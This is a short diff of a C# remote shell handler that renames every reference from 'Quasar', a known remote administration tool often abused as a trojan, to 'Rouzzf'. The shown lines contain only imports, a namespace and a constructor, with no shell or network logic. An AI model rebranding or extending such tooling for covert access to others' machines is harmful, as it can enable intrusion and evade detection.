@@ -1,10 +1,10 @@
-﻿using Quasar.Client.IO;
-using Quasar.Client.Networking;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.IO;
+using Rouzzf.Client.Networking;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 using System;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     /// <summary>
     /// Handles messages for the interaction with the remote shell.
@@ -19,13 +19,13 @@ namespace Quasar.Client.Messages
         /// <summary>
         /// The client which is associated with this remote shell handler.
         /// </summary>
-        private readonly QuasarClient _client;
+        private readonly RouzzfClient _client;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="RemoteShellHandler"/> class using the given client.
         /// </summary>
         /// <param name="client">The associated client.</param>
-        public RemoteShellHandler(QuasarClient client)
+        public RemoteShellHandler(RouzzfClient client)
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
